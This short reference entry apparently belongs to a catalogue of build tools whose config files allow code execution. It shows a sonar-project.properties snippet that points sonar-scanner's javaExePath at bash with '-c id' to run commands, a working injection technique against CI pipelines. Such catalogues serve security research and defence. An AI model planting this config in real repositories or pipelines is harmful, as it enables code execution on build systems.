---
title: SonarQube Scanner
tags:
- cli
- config-file
- eval-sh
references: 
- https://docs.sonarsource.com/sonarqube-server/9.6/analyzing-source-code/scanners/sonarscanner/
files: ['sonar-project.properties']
---

`sonar-scanner` is a scanner that uses an external server to evaluate the code security. It is configured via a config file named `sonar-projects.properties`. RCE can be achieved through `javaExePath`:

```properties
sonar.projectKey=ABC
sonar.scanner.javaExePath=/usr/bin/bash
sonar.scanner.skipJreProvisioning=true
sonar.scanner.javaOpts=-c id
```

*Note: `sonarsource/sonarqube-scan-action` changes directory to `/home/runner/work/_temp/sonarscanner`

